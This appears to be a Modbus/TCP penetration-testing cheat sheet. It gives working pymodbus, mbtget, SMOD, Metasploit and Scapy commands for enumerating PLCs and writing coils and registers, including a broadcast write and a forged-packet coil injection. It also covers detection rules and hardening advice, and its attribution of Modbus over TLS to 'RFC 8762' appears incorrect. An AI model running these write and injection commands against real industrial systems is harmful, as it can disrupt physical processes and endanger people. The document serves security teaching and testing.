---
title: "Modbus Protocol"
date: 2026-02-24
draft: false
---

## Overview

Modbus is a serial communication protocol developed in 1979 for use with PLCs (Programmable Logic Controllers). It has become a de facto standard in industrial communication and is widely deployed in ICS (Industrial Control Systems) and SCADA environments. Modbus/TCP exposes the protocol over TCP port 502 and, critically, has no built-in authentication or encryption. Any device that can reach port 502 can read sensor data, write to coils and registers, and potentially manipulate physical processes.

**Modbus is found in:**
- Power plants and substations
- Water treatment facilities
- Building automation (HVAC, lighting, access control)
- Manufacturing systems
- Oil and gas pipelines
- Medical equipment

**Default Port:** `502/TCP` (Modbus/TCP)

---

## Protocol Overview

Modbus uses a master/slave (client/server) architecture. The master sends requests; slaves respond.

### Data Types

| Object | Access | Notes |
|--------|--------|-------|
| Coil (Discrete Output) | Read/Write | Single bit, represents relay/actuator state |
| Discrete Input | Read-only | Single bit, sensor input |
| Input Register | Read-only | 16-bit word, analog input |
| Holding Register | Read/Write | 16-bit word, configuration/output values |

### Function Codes

| FC | Name | Description |
|----|------|-------------|
| 01 | Read Coils | Read multiple coils (digital outputs) |
| 02 | Read Discrete Inputs | Read digital inputs (sensors) |
| 03 | Read Holding Registers | Read configuration/output registers |
| 04 | Read Input Registers | Read analog input registers |
| 05 | Write Single Coil | Write one coil on/off |
| 06 | Write Single Register | Write one holding register |
| 15 | Write Multiple Coils | Write multiple coils |
| 16 | Write Multiple Registers | Write multiple holding registers |
| 17 | Report Slave ID | Get device info |
| 43 | Read Device Identification | Get vendor/product info |

---

## Recon and Fingerprinting

### Nmap

```bash
# Service detection
nmap -sV -p 502 TARGET_IP

# Modbus-specific nmap scripts
nmap -p 502 --script modbus-discover TARGET_IP

# Aggressive version scan
nmap -sV -sC -p 502 TARGET_IP

# Scan range for Modbus devices
nmap -p 502 --open --script modbus-discover 192.168.1.0/24
```

### Device Identification (FC43/FC17)

```bash
# Using mbtget — read device identification
mbtget -m enc -f 43 -u 1 TARGET_IP

# Report Slave ID (FC17)
mbtget -m rti -u 1 TARGET_IP

# Using modbus-cli
modbus read --host TARGET_IP --debug --unit-id 1 --function 17

# Using Python with pymodbus
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP', port=502)
c.connect()
# Report Slave ID
rr = c.report_slave_id(unit=1)
print('Slave ID:', rr.registers if hasattr(rr, 'registers') else rr)
# Read Device Identification
rd = c.read_device_information(unit=1)
print('Device:', rd)
c.close()
"
```

---

## Function Code Abuse — Reading Data

### FC01 — Read Coils (Digital Outputs)

```bash
# Read 100 coils starting at address 0
modbus read --host TARGET_IP --unit-id 1 --function 01 --address 0 --count 100

# mbtget syntax
mbtget -m rc -s 1 -r 0 -c 100 TARGET_IP

# pymodbus
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
rr = c.read_coils(0, 100, unit=1)
print('Coils:', rr.bits)
c.close()
"
```

### FC03 — Read Holding Registers

```bash
# Read 100 holding registers (most common for process values)
modbus read --host TARGET_IP --unit-id 1 --function 03 --address 0 --count 100

# All unit IDs from 1 to 255 (scan for all slaves)
for uid in $(seq 1 255); do
  result=$(mbtget -m rhr -s $uid -r 0 -c 10 TARGET_IP 2>/dev/null)
  if [[ $? -eq 0 ]]; then
    echo "Unit $uid: $result"
  fi
done
```

### FC04 — Read Input Registers

```bash
# Read analog inputs (sensor readings)
modbus read --host TARGET_IP --unit-id 1 --function 04 --address 0 --count 100

python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
rr = c.read_input_registers(0, 50, unit=1)
print('Input registers:', rr.registers)
c.close()
"
```

### Full Register Dump

```python
#!/usr/bin/env python3
"""
Complete Modbus data dump — reads all register types
"""
from pymodbus.client import ModbusTcpClient
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
MAX_UNIT_ID = 10
REGISTER_COUNT = 125  # Max per request

c = ModbusTcpClient(TARGET, port=PORT, timeout=5)
if not c.connect():
    print(f"[!] Cannot connect to {TARGET}:{PORT}")
    sys.exit(1)

print(f"[*] Connected to {TARGET}:{PORT}")
results = {}

for unit in range(1, MAX_UNIT_ID + 1):
    unit_data = {}

    # Read Coils (FC01)
    try:
        rr = c.read_coils(0, 100, unit=unit)
        if not rr.isError():
            unit_data['coils'] = list(rr.bits[:100])
    except Exception:
        pass

    # Read Discrete Inputs (FC02)
    try:
        rr = c.read_discrete_inputs(0, 100, unit=unit)
        if not rr.isError():
            unit_data['discrete_inputs'] = list(rr.bits[:100])
    except Exception:
        pass

    # Read Holding Registers (FC03)
    try:
        rr = c.read_holding_registers(0, REGISTER_COUNT, unit=unit)
        if not rr.isError():
            unit_data['holding_registers'] = rr.registers
    except Exception:
        pass

    # Read Input Registers (FC04)
    try:
        rr = c.read_input_registers(0, REGISTER_COUNT, unit=unit)
        if not rr.isError():
            unit_data['input_registers'] = rr.registers
    except Exception:
        pass

    if unit_data:
        print(f"[+] Unit {unit}: {list(unit_data.keys())}")
        results[unit] = unit_data

c.close()

with open('modbus_dump.json', 'w') as f:
    json.dump(results, f, indent=2)

print(f"[+] Saved to modbus_dump.json")
```

---

## Function Code Abuse — Writing Data

**WARNING: Writing to Modbus devices in production environments can cause physical damage, safety incidents, or process disruption. Only perform write operations in authorized lab or test environments.**

### FC05 — Write Single Coil (Turn On/Off)

```bash
# Write coil 0 to ON (value 0xFF00)
modbus write --host TARGET_IP --unit-id 1 --function 05 --address 0 --value 0xFF00

# Write coil 0 to OFF (value 0x0000)
modbus write --host TARGET_IP --unit-id 1 --function 05 --address 0 --value 0x0000

# pymodbus
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
# Turn on coil at address 0
rq = c.write_coil(0, True, unit=1)
print('Write coil result:', rq)
# Turn off
rq = c.write_coil(0, False, unit=1)
print('Write coil result:', rq)
c.close()
"
```

### FC06 — Write Single Register

```bash
# Write value 1234 to holding register 0
modbus write --host TARGET_IP --unit-id 1 --function 06 --address 0 --value 1234

python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
rq = c.write_register(0, 1234, unit=1)
print('Write register result:', rq)
c.close()
"
```

### FC16 — Write Multiple Registers

```bash
# Write 0 to registers 0-9 (potential process upset)
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
rq = c.write_registers(0, [0]*10, unit=1)
print('Write multiple registers result:', rq)
c.close()
"
```

---

## Device Fingerprinting

Different vendors use specific register layouts. Fingerprinting helps identify the device type.

### Common Vendor Patterns

| Vendor | Identification Method |
|--------|----------------------|
| Schneider Electric | FC43 OID 0x01-0x02 returns "Schneider" |
| Siemens | Register 0-5 contains firmware version |
| Allen-Bradley | Custom FC codes, specific register layout |
| ABB | Device ID string in slave ID response |
| Moxa | TCP banner + FC17 response |

```python
#!/usr/bin/env python3
"""Modbus device fingerprinter."""
from pymodbus.client import ModbusTcpClient
from pymodbus.constants import DeviceInformation

def fingerprint(target, port=502, unit=1):
    c = ModbusTcpClient(target, port=port)
    if not c.connect():
        return None

    info = {}

    # FC17 - Report Slave ID
    try:
        r = c.report_slave_id(unit=unit)
        if not r.isError() and hasattr(r, 'raw_id'):
            info['slave_id'] = r.raw_id.hex()
    except Exception:
        pass

    # FC43 - Device Identification
    for oid in [DeviceInformation.Basic, DeviceInformation.Regular, DeviceInformation.Extended]:
        try:
            r = c.read_device_information(read_code=oid, object_id=0, unit=unit)
            if not r.isError():
                for k, v in r.information.items():
                    info[f'ident_{k}'] = v.decode('utf-8', errors='replace')
        except Exception:
            pass

    # Read first 10 holding registers — check for version patterns
    try:
        r = c.read_holding_registers(0, 10, unit=unit)
        if not r.isError():
            info['h_reg_0_10'] = r.registers
    except Exception:
        pass

    c.close()
    return info

result = fingerprint("TARGET_IP")
if result:
    print("[+] Device fingerprint:")
    for k, v in result.items():
        print(f"  {k}: {v}")
```

---

## PLC Manipulation Risks

The following actions are possible on unauthenticated Modbus endpoints and represent real-world attack scenarios documented in ICS security research:

| Action | Function Code | Risk |
|--------|---------------|------|
| Disable actuator | FC05 — write coil OFF | Stop conveyor, close valve |
| Force actuator ON | FC05 — write coil ON | Open valve, start pump continuously |
| Falsify sensor reading | FC16 — overwrite input registers | Bypass safety threshold |
| Change setpoint | FC06 — modify holding register | Overheat, overpressure |
| DoS via broadcast | FC05/FC16 with unit 0 | Affect all slaves simultaneously |
| Firmware manipulation | Vendor-specific FC (65+) | Persistence, brick device |

### Modbus Broadcast Attack

```bash
# Unit ID 0 is the broadcast address — all slaves execute
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET_IP')
c.connect()
# Write to ALL slaves simultaneously (unit=0 = broadcast)
rq = c.write_register(0, 0xDEAD, unit=0)
print('Broadcast write:', rq)
c.close()
"
```

---

## Tools

| Tool | Usage | Install |
|------|-------|---------|
| `modbus-cli` | CLI for Modbus read/write | `gem install modbus-cli` |
| `mbtget` | Read Modbus devices | `apt install mbtget` |
| `pymodbus` | Python Modbus library | `pip3 install pymodbus` |
| `nmap` | `modbus-discover` NSE script | Built-in |
| `Metasploit` | `auxiliary/scanner/scada/modbus_findunitid` | Built-in |
| `SMOD` | Modbus penetration testing framework | GitHub |
| `ModbusPal` | GUI Modbus simulator | Java jar |
| `modbuspal` | PLC simulation for testing | Sourceforge |
| `Scapy` | Custom Modbus packet crafting | `pip3 install scapy` |

### SMOD — Modbus Penetration Testing Framework

```bash
# Install SMOD
git clone https://github.com/enddo/smod
cd smod
python smod.py

# SMOD is an interactive framework with modules for:
# - Discovery:           scan for Modbus/TCP devices on the network
# - Function code enum:  brute force valid function codes per unit
# - Register read/write: structured read/write operations
# - Device fingerprinting: FC17/FC43 device identification
#
# Within SMOD interactive shell:
# > use modbus/scanner/discover
# > set RHOST TARGET_IP
# > run
#
# > use modbus/function/read_holding_registers
# > set RHOST TARGET_IP
# > set UNIT 1
# > run
```

### Metasploit Modules

```bash
msfconsole -q

# Find unit IDs
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS TARGET_IP
run

# Read registers
use auxiliary/scanner/scada/modbusclient
set RHOSTS TARGET_IP
set DATA_ADDRESS 0
set DATA_COILS 100
set UNIT_NUMBER 1
run

# Read/Write specific registers
set ACTION READ_REGISTERS
set DATA_ADDRESS 0
run
```

---

## SCADA/ICS Context — Operational Impact

Understanding the context of each Modbus register is critical to assessing impact:

```python
#!/usr/bin/env python3
"""
Context-aware Modbus assessment — maps register values to process meaning
"""
# Example: Water treatment plant register map (hypothetical)
REGISTER_MAP = {
    0: {"name": "Pump 1 Status", "type": "coil", "values": {0: "OFF", 1: "ON"}},
    1: {"name": "Pump 2 Status", "type": "coil", "values": {0: "OFF", 1: "ON"}},
    100: {"name": "Flow Rate (L/min)", "type": "input_reg", "scale": 0.1},
    101: {"name": "Pressure (bar)", "type": "input_reg", "scale": 0.01},
    200: {"name": "Flow Setpoint", "type": "holding_reg", "scale": 0.1},
    201: {"name": "Pressure Setpoint", "type": "holding_reg", "scale": 0.01},
    300: {"name": "Alarm Status", "type": "holding_reg", "values": {0: "Normal", 1: "Warning", 2: "Critical"}},
}

from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("TARGET_IP")
c.connect()

for addr, info in REGISTER_MAP.items():
    if info['type'] == 'coil':
        r = c.read_coils(addr, 1, unit=1)
        if not r.isError():
            val = r.bits[0]
            label = info.get('values', {}).get(int(val), str(val))
            print(f"  Coil {addr} ({info['name']}): {label}")
    elif info['type'] in ('input_reg', 'holding_reg'):
        fn = c.read_input_registers if info['type'] == 'input_reg' else c.read_holding_registers
        r = fn(addr, 1, unit=1)
        if not r.isError():
            raw = r.registers[0]
            if 'scale' in info:
                val = raw * info['scale']
            elif 'values' in info:
                val = info['values'].get(raw, raw)
            else:
                val = raw
            print(f"  Reg {addr} ({info['name']}): {val}")

c.close()
```

---

## Detection and Monitoring

```bash
# Wireshark capture filter for Modbus/TCP
# Filter: tcp.port == 502 && modbus

# tshark capture
tshark -i eth0 -f "tcp port 502" -T fields \
  -e frame.time \
  -e ip.src \
  -e modbus.func_code \
  -e modbus.reference_num \
  -e modbus.word_cnt

# Snort rule for write operations
# alert tcp any any -> any 502 (msg:"Modbus Write Coil FC05"; content:"|00 00 00 00|"; offset:2; depth:4; content:"|05|"; offset:7; depth:1; sid:1000001;)
```

---

## Protocol Weaknesses — Security Design Flaws

Modbus/TCP has fundamental security weaknesses by design. Understanding these is essential for assessing impact and advising on compensating controls.

### 1. No Integrity Check (No MAC/HMAC)

The Modbus TCP Application Protocol header (MBAP) contains no Message Authentication Code or cryptographic checksum. An attacker in a MitM position can intercept and modify register values or coil states in-flight without any detection by the PLC or master. The MBAP header has no signature field — only a Transaction Identifier (2 bytes), Protocol Identifier (2 bytes, always 0x0000), Length (2 bytes), and Unit Identifier (1 byte).

**Impact:** Register falsification attacks are undetectable at the protocol layer.

### 2. No Anti-Replay Protection

The standard Modbus protocol includes no sequence numbers or timestamps. A captured FC05 "Write Single Coil" command — for example, a packet that opens a valve or starts a pump — can be replayed arbitrarily long after capture with full effect. The PLC has no mechanism to distinguish a fresh command from a replayed one.

**Impact:** Captured control commands can be replayed months later during targeted operations without any modification.

### 3. Predictable Transaction Identifiers

The Transaction Identifier (MBAP header bytes 0-1) is implementation-defined and in many devices is either static (always 0x0000 or 0x0001) or incrementally counter-based. This makes blind injection feasible: an attacker does not need to sniff live traffic to forge a valid Transaction ID.

```python
# Craft a Modbus TCP packet with guessed Transaction ID (e.g., 0x0001)
# to inject a FC05 "Write Single Coil ON" command to unit 1, coil 0
from scapy.all import *

# MBAP header + PDU: Transaction ID=0x0001, Protocol=0x0000, Length=6, Unit=1
# PDU: FC=0x05 (Write Single Coil), Addr=0x0000, Value=0xFF00 (ON)
payload = bytes([
    0x00, 0x01,   # Transaction Identifier
    0x00, 0x00,   # Protocol Identifier (Modbus = 0)
    0x00, 0x06,   # Length (6 bytes follow)
    0x01,         # Unit Identifier
    0x05,         # Function Code: Write Single Coil
    0x00, 0x00,   # Coil Address: 0
    0xFF, 0x00,   # Value: 0xFF00 = ON
])
send(IP(dst="TARGET_IP")/TCP(dport=502)/Raw(load=payload))
```

**Impact:** Arbitrary Modbus commands can be injected without capturing prior traffic.

---

## Hardening Recommendations

- Modbus/TCP should never be exposed to the internet or untrusted networks
- Use Modbus-aware firewalls (Tofino, Claroty, Nozomi) to restrict allowed function codes
- Implement network monitoring for anomalous Modbus write operations
- Deploy Modbus at OSI Layer 2 using serial connections where possible
- Use encrypted overlay protocols (VPN) if TCP transport is required
- Vendor-specific secure variants: Modbus over TLS (RFC 8762, port 802)
- Regularly audit which systems have access to PLC/SCADA Modbus ports
- Implement unidirectional data diodes for read-only monitoring use cases


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.